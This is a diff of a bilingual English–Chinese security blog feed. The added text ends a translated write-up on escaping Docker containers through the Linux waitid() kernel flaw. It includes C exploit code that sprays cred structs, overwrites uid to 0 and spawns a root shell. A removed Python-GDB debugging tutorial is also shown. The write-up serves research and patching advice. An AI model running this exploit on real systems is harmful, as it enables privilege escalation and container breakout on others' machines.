+&lt;p&gt;A few step commands after the breakpoint (it took 5 on my system) should reveal the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; address in the RAX register.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;斷下來後，步進幾個指令(在我的系統上是 5 個)應該會在 RAX 暫存器中顯示 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 的位址。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;We can repeat that process of finding the struct for a number of forks in order to collect enough addresses and analyze the statistics of where the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; is most likely to be in the heap&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們可以重複這個找結構的過程，藉由數個分叉(fork)以便收集足夠的位址並分析統計 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred&lt;/code&gt; 在堆積中最有可能的所在。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So the plan is as follows:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;計畫如下:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Spawn thousands of processes by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; in order to create thousands of &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; in the kernel heap and make each of the processes constantly check if its UID==0 by calling &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Start writing the value 0 to addresses to which the &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; might land&lt;/li&gt;
+  &lt;li&gt;If and when one of our forked processes gets uid==0, it means that we have successfully overwritten the &lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt; value with our guesses from step 2. Now we can overwrite the rest of the &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; and change caps by writing to the offsets that we determined.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;blockquote&gt;
+  &lt;ol&gt;
+    &lt;li&gt;為了在核心堆積中創造數千個 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred structs&lt;/code&gt; 需要透過呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;fork()&lt;/code&gt; 產生數千個行程，並且呼叫 &lt;code class=&quot;highlighter-rouge&quot;&gt;getuid()&lt;/code&gt; 使每個行程都不斷地檢查它自己的 UID 是否為 0&lt;/li&gt;
+    &lt;li&gt;開始將 0 寫入位 &lt;code class=&quot;highlighter-rouge&quot;&gt;struct cred-&amp;gt;uid&lt;/code&gt; 可能的落點位址中&lt;/li&gt;
+    &lt;li&gt;當其中一個我們分叉(fork)出來的行程獲得 uid 為 0，就代表我們已經成功從第二步猜測到並覆寫了&lt;code class=&quot;highlighter-rouge&quot;&gt;uid&lt;/code&gt;的值。現在我們可以覆寫 &lt;code class=&quot;highlighter-rouge&quot;&gt;cred struct&lt;/code&gt; 其餘的部分並藉由覆寫我們計算的值來修改 caps。&lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Our dirty exploit will be something to the effect of:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我們的髒髒漏洞利用效果如下:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;void writecaps(char *addr,unsigned long value){
+while(1) {
+      int pid = clone(exit_func, &amp;amp;amp;new_stack[5000], CLONE_VM | SIGCHLD, NULL);
+      if (!pid) {
+        exit(0);
+      }
+      if (pid == value) {
+        syscall(SYS_waitid, P_PID, pid, addr, WEXITED, NULL);
+        break;
+      }
+}
+
+void spraynpray(){
+pid_t pid;
+FILE *f;
+char *argv[] = {&quot;/bin/sh&quot;, NULL};
+for (int i=0;i&amp;lt;5000;i++)
+{
+    pid = fork();
+    if (pid==0)
+    { // child process
+  while (1) {
+    
+    if (*glob_var==1) {
+      syscall(SYS_exit, 0);
+    }
+    if (getuid() == 0){
+        //FOUND!!
+    printf(&quot;[+] Got UID: 0 !\n&quot;);
+     *glob_var = 1;
+     writecaps((char *)finalcapsaddress,value);
+    printf(&quot;Done, spawning a shell \n&quot;);
+    execve(&quot;/bin/sh&quot;, argv, NULL);
+    }
+}
+    }
+
+    else if(pid&amp;lt;0)
+    {
+        printf(&quot;failed to fork&quot;);
+    }
+
+    else // parent process
+    {
+
+    }
+}
+}
+
+void swapuid(){
+
+    char* i,p;
+    while(*glob_var!=1)
+    {
+    for(i = (char *)0xffff8800321b4004; ; i+=0xc0)
+        {
+        if(*glob_var==1)
+            {
+            break;
+            }
+        printf(&quot;trying %p\n&quot;,i);
+        syscall(__NR_waitid, P_PID, 0,(siginfo_t *)i, WEXITED, NULL);
+        sleep(1);
+        }
+    }
+munmap(glob_var, sizeof *glob_var);
+printf(&quot;Found uid on %p\n&quot;,i-0xc0);
+sleep(10000);
+}
+
+int main(void)
+{
+    glob_var = mmap(NULL, sizeof *glob_var, PROT_READ | PROT_WRITE,
+                    MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    *glob_var = 0;
+
+unsigned long* base = findbase();
+    findheapbase();
+    spraynpray();
+    swapuid();
+}
+    
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After analyzing my system (Ubuntu 17.10,Kernel 4.13.0-15, arch x86-64), I found a couple of areas where it seemed that cred struct is more likely to land in about 70% of the executions, but there is still a risk of crashing the machine because we may overwrite something important in the kernel.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在分析我的系統資後 (Ubuntu 17.10, 核心 4.13.0-15, 架構 x86-64)，我發現數個區域貌似是運行時 creds 結構有 70% 以上的落點，但那仍然有使機器掛掉的風險存在，因為我們可能會覆寫到核心中重要的東西。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;conclusion--結論&quot;&gt;Conclusion / 結論&lt;/h2&gt;
+
+&lt;p&gt;In 2017 alone, 434 linux kernel exploits where found, and as you have seen in this post, kernel exploits can be devastating for containerized environments. This is because containers share the same kernel as the host, thus trusting the built-in protection mechanisms alone isn’t sufficient. Make sure your kernel is always updated on all of your production hosts.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;光是 2017 年就已經有 &lt;a href=&quot;https://www.cvedetails.com/product/47/Linux-Linux-Kernel.html?vendor_id=33&quot;&gt;434 個 Linux 核心漏洞利用&lt;/a&gt;被發現，如同你在這篇文章中看到的一樣，核心漏洞利用對容器環境來說是具毀滅性的。這是因為容器與主機分享核心，因此光是信任內建的保護機制並不足夠。確保你的核心在所有的產品主機都總是最新的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Thank you for reading and don’t forget to follow us @TwistlockLabs.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;謝謝你的閱讀，別忘了在 &lt;a href=&quot;https://twitter.com/TwistlockLabs&quot;&gt;@TwistlockLabs&lt;/a&gt; 跟隨我們。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Big credits to Federico Bento for pointing some things out and to &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt; for his Chrome sandbox escape exploit; my exploitation is heavily based on their work.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;給點清了某些事情的&lt;a href=&quot;https://reverse.put.as/2017/11/07/exploiting-cve-2017-5123/&quot;&gt;Federico Bento&lt;/a&gt;一個大大的讚， &lt;a href=&quot;https://salls.github.io/Linux-Kernel-CVE-2017-5123/&quot;&gt;Chris Salls&lt;/a&gt;也是，感謝他的 Chrome 沙盒逃脫漏洞利用; 我的漏洞利用大多數是基於他們的成果。&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>jhe</name></author><summary type="html">The post describes how I exploited the waitid() vulnerability in order to modify the Linux capabilities of a Docker container to gain elevated privileges, and ultimately escape the container jail. If you wnat to see how Twistlock would stop this vulnerability in its tracks, check out my follow up blog.</summary></entry><entry><title type="html">Linux ELF 二進位檔案入門：搞懂兼分析</title><link href="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html" rel="alternate" type="text/html" title="Linux ELF 二進位檔案入門：搞懂兼分析" /><published>2018-03-08T00:00:00+08:00</published><updated>2018-03-08T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/the-101-of-elf-binaries-on-linux-understanding-and-analysis.html">&lt;h1 id=&quot;the-101-of-elf-binaries-on-linux-understanding-and-analysis&quot;&gt;The 101 of ELF Binaries on Linux: Understanding and Analysis&lt;/h1&gt;
 
 &lt;h2 id=&quot;executable-and-linkable-format-可執行檔與可連結格式&quot;&gt;Executable and Linkable Format 可執行檔與可連結格式&lt;/h2&gt;
 
@@ -232,7 +678,7 @@
 &lt;p&gt;An ELF file consists of zero or more segments, and describe how to create a process/memory image for runtime execution. When the kernel sees these segments, it uses them to map them into virtual address space, using the mmap(2) system call. In other words, it converts predefined instructions into a memory image. If your ELF file is a normal binary, it requires these program headrs, otherwise it won’t run. And it uses these headers, with the underlying data structure, to form a process. This process is similar for shared libraries.&lt;/p&gt;
 
 &lt;blockquote&gt;
-  &lt;p&gt;一個 ELF 檔案由至少零個區段組成，並且描述如何創造一個執行時期的行程/記憶體映像。當核心看到這些區段，它使用系統呼叫 mmap(2) 將他們映射到虛擬位址空間，換句話來說，它轉換預先定義的指令到記憶體映像中。如果你的 ELF 檔案是一個普通的二進位檔，它將需求這些程式標頭，否則無法運行。並且它使用這些標頭，與底層資料結構來形成一個程序。這個程序與共享函式庫類似。&lt;/p&gt;
+  &lt;p&gt;一個 ELF 檔案由零個或更多區段組成，並且描述如何創造一個執行時期的行程/記憶體映像。當核心看到這些區段，它使用系統呼叫 mmap(2) 將他們映射到虛擬位址空間，換句話來說，它轉換預先定義的指令到記憶體映像中。如果你的 ELF 檔案是一個普通的二進位檔，它將需求這些程式標頭，否則無法運行。並且它使用這些標頭，與底層資料結構來形成一個程序。這個程序與共享函式庫類似。&lt;/p&gt;
 &lt;/blockquote&gt;
 
 &lt;p&gt;&lt;img src=&quot;https://assets.linux-audit.com/wp-content/uploads/2015/08/elf-program-headers-segments.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
@@ -2030,740 +2476,4 @@ Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0
 
 &lt;h2 id=&quot;結論&quot;&gt;結論&lt;/h2&gt;
 
-&lt;p&gt;雖然在殺戮鏈 (kill chain）中有更多收益較高的機會可以進一步檢測攻擊者的活動，但我們認為檢測偵察活動不應該被忽視。偵察自己的網路，並由攻擊者觀點來獲得潛在弱點。網路結構本該規劃成可監控關鍵的內部網路和系統，並將偵查工作集中在那裡。從自我偵查開始，並以此持續優化您個人的高保真度特徵值。&lt;/p&gt;</content><author><name>NotSurprised</name></author><category term="recon" /><summary type="html">Blue Team：檢測偵察活動</summary></entry><entry><title type="html">用 GDB 來除錯 Python</title><link href="https://security-onigiri.github.io//2017/11/17/jeff-mcneil-debugging-your-python-with-gdb-ftw.html" rel="alternate" type="text/html" title="用 GDB 來除錯 Python" /><published>2017-11-17T00:00:00+08:00</published><updated>2017-11-17T00:00:00+08:00</updated><id>https://security-onigiri.github.io//2017/11/17/jeff-mcneil-debugging-your-python-with-gdb-ftw</id><content type="html" xml:base="https://security-onigiri.github.io//2017/11/17/jeff-mcneil-debugging-your-python-with-gdb-ftw.html">&lt;h1 id=&quot;debugging-your-python-with-gdb-ftw&quot;&gt;Debugging Your Python With GDB (FTW!)&lt;/h1&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;編按：具體文章已遺失，透過網路找到 cache 文章來翻譯&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;In this post we’ll take a look at how to debug your Python code using GDB. It is a handy thing to understand, especially if you’re confronted with an unexpected SEGV or other less than helpful error. I do realize there is some awesome pytohn-gdb.py integration with GDB. I purposefully ignored that.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;在這邊文章中我們將一起探究如何使用 GDB 來為 Python 程式碼除錯。這是一個手工活，特別是你遭遇過一個非預期的 SEGV(SegmentationFault) 或是沒有任何幫助的錯誤訊息。我理解有些像 python-gdb.py 等很讚的 GDB 整合工具，這裡故意忽略不探討之。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;As an unfortunate note, I started doing this using Python 3.3, but at some point, I switched 2.6 accidentally. I’ve migrated the earlier pieces to 2.6. If anyone smarter than I notices an inconsistency, this is why. I’m fairly certian I’ve cleaned it all up.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;作為一個不幸的紀錄，我剛開始是使用 Python 3.3，但是在某些點上我偶然間換到 2.6。我已經遷移早些的東西到 2.6。如果任何聰明過我的人有注意到矛盾處，這就是原因，我相當的確定已經都處理好了。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Finally, the GDB formatting is mine. I attempted to make it slightly more readable. Hope it helps.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;終於，GDB 格式是我的了。我傾向於讓它更具可讀性，希望這樣有幫助。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;how-does-python-evaluate-code---python-如何解釋程式碼-&quot;&gt;How Does Python Evaluate Code ? / Python 如何解釋程式碼 ？&lt;/h3&gt;
-
-&lt;p&gt;First, a little bit of background. Python implements a stack-based virtual machine. Python byte code manipulates that stack during normal execution. For example, let’s take a look at a small application disassembled into byte code:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;首先，來點背景知識。Python 實做一個基於堆疊的虛擬機 Python byte code 在執行時期操作該堆疊。例如，讓我們觀察一個反組譯成 byte code 的小程式:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This is a fairly trivial example that should show us a good sampling of the “instruction set.” We’re going to skim over this bit as understanding all of the byte code operations really isn’t necessity here. When we use the dis module, we see that the following code is generated:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;這是一個相當顯而易見的例子，應該可以很好的表達指令集的範例。在這裡詳細的了解 byte code 操作並不是很必須的，所以我們將忽略它。當我們使用 dis 模組，我們看到產生的程式碼如下:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1    0 LOAD_CONST    0(1)
-     3 STORE_NAME    0(a)
-
-2    6 LOAD_CONST    1(2)
-     9 STORE_NAME    1(b)
-
-3   12 LOAD_NAME     0(a)
-    15 LOAD_NAME     1(b)
-
-4   22 LOAD_NAME     2(c)
-    25 PRINT_ITEM
-    26 PRINT_NEWLINE
-    27 LOAD_CONST    2(None)
-    30 RETURN_VALUE
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This is fairly self explanatory. We see at position 1 that the constants 1 &amp;amp; 2 are placed into a &amp;amp; b. Next, they’re placed on the stack and BINARY_ADD is called, which triggers the addition of two number objects. Next, STORE_NAME saves the value of the add operation (from the top of the stack) to the location c. Finally, we load c and call the print operations. In Python 3, this would simply call the print function, via CALL_FUNCTION. For an overview of how Python generates bytecode from Python code, see Python/compile.c. The comment at the top of the file is quite helpful.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;相當不言自明的。我們看到位置 &lt;em&gt;1&lt;/em&gt; 常數 &lt;em&gt;1&lt;/em&gt; 與 &lt;em&gt;2&lt;/em&gt; 被放入 &lt;em&gt;a&lt;/em&gt; 與 &lt;em&gt;b&lt;/em&gt;。下一個，他們被放置在堆疊上，而觸發兩個數字物件相加的 BINARY_ADD 則被呼叫了，接下來 STORE_NAME 儲存了加法運算的值 (從堆疊的頂端) 到位置 &lt;em&gt;c&lt;/em&gt;. 最後，我們載入 &lt;em&gt;c&lt;/em&gt; 並且呼叫 print 操作。在 Python 3 將簡單透過 CALL_FUNCTION 呼叫 print 函式。為了要知道 Python 如何從 Python 程式碼產生 bytecode ，可以參照 Python/compile.c 。在該檔案頂端的註解非常的有幫助。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Using Python 2.6 as a reference point, all of this happens at Python/ceval.c. The function handling byte code execution is named PyEval_EvalFrameEx. Generally, this is a big switch statement. I use the term switch loosely as it is actually a collection of computed goto labels on both Mac OS and Linux (Visual Studio doesn’t allow that).&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;使用 Python 2.6 作為一個參考點，所有的這些流程都發生在 Python/ceval.c。處理執行 bytecode 的函式名為 &lt;em&gt;PyEval_EvalFrameEx&lt;/em&gt;。大致上，這是一個大型的 switch 陳述語句。在 Mac OS 與 Linux 上我使用 switch 這個詞泛指實際上是一個計算過後的 &lt;em&gt;goto&lt;/em&gt; 標籤集合 (在 Visual Studio 上不允許)。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Looking at this function, you’ll see various entries such as this;&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;看這個函釋，你將看到各種類似這樣的進入點&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;case POP_TOP:
-    v = POP();
-    Py_DECREF(v);
-    goto fast_next_opcode;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This is the implementation for the POP_TOP instuction. The POP macro returns the top value of the stack and the subsequent Py_DECREF(v) decrements the reference count. At this point, that could trigger execution of v-&amp;gt;ob_type-&amp;gt;tp_del &amp;amp; v-&amp;gt;ob_type-&amp;gt;tp_dealloc, if the reference count of v (v-&amp;gt;ob_refcnt) has reached zero. As an aside, note that Python checks for events/thread switches every sys.getcheckinterval() instuctions. If the corresponding implementation of an instruction is complex (and doesn’t release the GIL), we can be left waiting here.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;這是 &lt;em&gt;POP_TOP&lt;/em&gt; 指令的實作。&lt;em&gt;POP&lt;/em&gt; 巨集返回堆疊頂端上的值，隨後的 &lt;em&gt;Py_DECREF(v)&lt;/em&gt; 減少參考計量。在此，如果 v (v-&amp;gt;ob_refcnt) 的參考計量為 &lt;em&gt;0&lt;/em&gt; 則會觸發 &lt;em&gt;v-&amp;gt;ob_type-&amp;gt;tp_del&lt;/em&gt; 與 &lt;em&gt;v-&amp;gt;ob_type-&amp;gt;tp_dealloc&lt;/em&gt; 的執行。另外，Python 會在每個 &lt;em&gt;sys.getcheckinterval()&lt;/em&gt; 指令檢查事件與執行緒的切換。我們將需要等待，如果對應的指令實作是複雜的 (而且不釋放 GIL)。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Now, we come to the function we’re interested in:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;現在來到我們的目標函式:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;PyObject * PyEvalCodeEx(PyObject *co, PyObject *globals, PyObject *locals, PyObject **args, int argcount, PyObject **kws, int kwcount, PyObject **defs, int defcount, PyObject *closure);
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Essentially this fucntion builds a frame from the code object being executed and relies on PyEval_PyEvalFrameEx to handle bytecode instruction evaluation. The code object contains references to globals, locals, nested scopes (free vars/cell vars, depending on the angle), etc. PyEvalCodeEx “transforms” that into a PyFrameObject.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;本質上這個函式從被執行的程式碼物件建立一個 &lt;em&gt;frame&lt;/em&gt; 並依靠 &lt;em&gt;PyEval_PyEvalFrameEx&lt;/em&gt; 來處理 bytecode 指令的解釋。程式碼物件包含對 &lt;em&gt;globals&lt;/em&gt;、&lt;em&gt;locals&lt;/em&gt;、巢狀作用域(free vars/cell vars, 視角度而定) 等的參考。 &lt;em&gt;Py_EvalCodeEx&lt;/em&gt; 將之轉換成一個 PyFrameObject。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;It is this code object evalution function we’re interested in as functions and methods are generally boiled down to code objects.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我們感興趣的程式碼解釋物件作為函式與方法通常歸根究柢都是程式碼物件。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;python-data-structure-data-structures--python-資料結構資料結構&quot;&gt;Python Data Structure Data Structures / Python 資料結構資料結構&lt;/h3&gt;
-
-&lt;p&gt;Now that we’ve covered where to look, we need to take a look at what to look for. This means building a bit of an understanding around a few data structures.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;我們已經過了要看哪裡的部分，我們需要看一下我們在尋找什麼。這代表建立一些資料結構的背景知識。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h4 id=&quot;type-objects--型態物件&quot;&gt;Type Objects / 型態物件&lt;/h4&gt;
-
-&lt;p&gt;All of Python’s classes (well, almost) are represented by PyTypeObject objects, which is defined in Python/Include/Object.h. This structure contains a whole lot of fields. Most of these fields will be pretty familiar looking as this is generally how “dunder”, or __methods__, are implemented. Standard, generic values are used(see PyType_Ready) if you don’t setup your own. This is a long structure, but including it here is relevant:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;所有的 Python 類別(幾乎啦) 是用 PyTypeObject 物件來表示，定義在 &lt;em&gt;Python/Include/Object.h&lt;/em&gt;。這個結構包含一脫拉庫的欄位。大部分的欄位大概就是 “dunder” (編按：dunder 為 python 用來表示被雙底線夾住的目標，如 dunder getitem 就是 __getitem__)或 &lt;em&gt;__methods__&lt;/em&gt; 如何被實作的。使用標準的值(參照 PyType_Ready) 如果你不自己設定。這是一個落落長的資料結構，但在這裡提到是有意義的。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;typedef struct _typeobject {
-    PyObject_VAR_HEAD
-    const char *tp_name; /* For printing, in format &quot; */
-    Py_ssize_t tp_basicsize, tp_itemsize; /* For allocation */
-    /* Methods to implement standard operations */
-    destructor tp_dealloc;
-    printfunc tp_print;
-    getattrfunc tp_getattr;
-    setattrfunc tp_setattr;
-    comfunc tp_compare;
-    reprfunc tp_repr;
-    
-    /* Method suites for standard classes */
-    PyNumberMethods *tp_as_number;
-    PySequenceMethods *tp_as_sequence;
-    PyMappingMethods *tp_as_mapping;
-    /* More standard operations (here for binary compatiblility) */
-    hashfunc tp_hash;
-    ternaryfunc tp_call;
-    reprfunc tp_str;
-    getattrofunc tp_getattro;
-    setattrofunc tp_setattro;
-    
-    /* Functions to access object as input/output buffer */
-    PyBufferProcs *tp_as_buffer;
-    
-    /* Flags to define presence of optional/expanded features */
-    long tp_flags;
-                            
-    const char *tp_doc; /* Docuemntatioin string */
-    
-    /* Assigned meaning in release 2.0 */
-    /* call function for all accessible objects */
-    traverseproc tp_traverse;
-                            
-    /* delete refereces to contained objects */
-    inquiry tp_clear;
-    
-    /* Assigned meaning in release 2.1 */
-    /* rich comparisions */
-    richcmpfunc tp_richcompare;
-    
-    /* weak reference enabler */
-    Py_ssize_t tp_weaklistoffset;
-                            
-    /* Added in release 2.2 */
-    /* Iterators */
-    getiterfunc tp_iter;
-    iternextfunc tp_iternext;
-
-    /* Attribute descriptor and subclassing stuff */
-    struct PyMethodDef *tp_methods;
-    struct PyMemberDef *tp_members;
-    struct PyGetSetDef *tp_getset;
-    struct _typeobject *tp_base;
-    PyObject *tp_dict;
-    descrgetfunc tp_descr_get;
-    descrsetfunc tp_descr_set;
-    Py_ssize_t tp_dictoffset;
-    initproc tp_init;
-    allocfunc tp_alloc;
-    newfunc tp_new;
-    freefunc tp_free; /* Low-level free-memory routine */
-    inquiry tp_is_gc; /* For PyObject_IS_GC */
-    PyObject *tp_bases;
-    PyObject *tp_mro; /* method resolution order */
-    PyObject *tp_cache;
-    PyObject *tp_subclasses;
-    PyObject *tp_weaklist;
-    destructor tp_del;
-
-    /* Type attribute cache version tag. Added in version 2.6 */
-    unsigned int tp_version_tag;
-
-#ifdef COUNT_ALLOCS
-    /* these must be last and never explicitly initialized */
-    Py_ssize_t tp_allocs;
-    Py_ssize_t tp_frees;
-    Py_ssize_t tp_maxalloc;
-    struct _typeobject *tp_prev;
-    struct _typeobject *tp_next;
-#endif                            
-} PyTypeObject;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The typedef (typedefs? Anyone know the plural of #typedef?) above (i.e. PyNumberMethods) are the C-level equivalent of the double underscore methods required to implement a certain protocol (programmatic interface). They expand into method collections:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;em&gt;typedef&lt;/em&gt; (typedefs? 有任何人知道這個 typedef 的複數嗎?) 之上 (如 PyNumberMethods) 是 C 層級等同於雙底線方法，是實作一個特定協定必須的 (計畫性的介面)。他們擴展成方法的集合:&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct {
-    lenfunc mp_length;
-    binaryfunc mp_subscript;
-    objobjargproc mp_ass_subscript;
-} PyMappingMethods;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;These translate into len, subscript, and subscript assignment.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;這些翻譯成 &lt;em&gt;len&lt;/em&gt;、&lt;em&gt;subscript&lt;/em&gt;與 &lt;em&gt;subscript 賦值&lt;/em&gt;。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h3 id=&quot;instances--實例&quot;&gt;Instances / 實例&lt;/h3&gt;
-
-&lt;p&gt;All Python instances are all implemented as pointers to PyObject values, which is defined as:&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;所有的 Python 實例都是實作成指標指向 PyObject，定義如&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;typedef struct _object {
-    PyObject_HEAD
-} PyObject;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;PyObject_HEAD, by default, expands to include only a pointer to the object’s type (type objects have a type of type!) and the reference count.&lt;/p&gt;
-&lt;blockquote&gt;
-  &lt;p&gt;預設為 PyObject_HEAD，擴展包括只有一個指標指向物件的型態(type 物件有一個型態的型態!) 與 參考計量。&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/* PyObject_HEAD defines the initial segment of every PyObject. */
-#define PyObject_HEAD                   \
-    _PyObject_HEAD_EXTRA                \
-    Py_ssize_t ob_refcnt;               \
-    struct _typeobject *ob_type;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Wait! Where is all of the per-instance data you say? For classes that do not define __slots__, there is a dictoffset member of the corresponding PyTypeObject structure. This provides the address, via offset from the end of the PyObject structure, that contains a Python dictionary. This is the __dict__ used to store per instance information.  If __slots__ is defined, then dictoffset is NULL and the slot values are stored at the end of the PyObject structure and accessed via descriptors. Generic structures are passed around via casting (and turned back into concrete values via the same method).&lt;/p&gt;
-
-&lt;blockquote&gt;
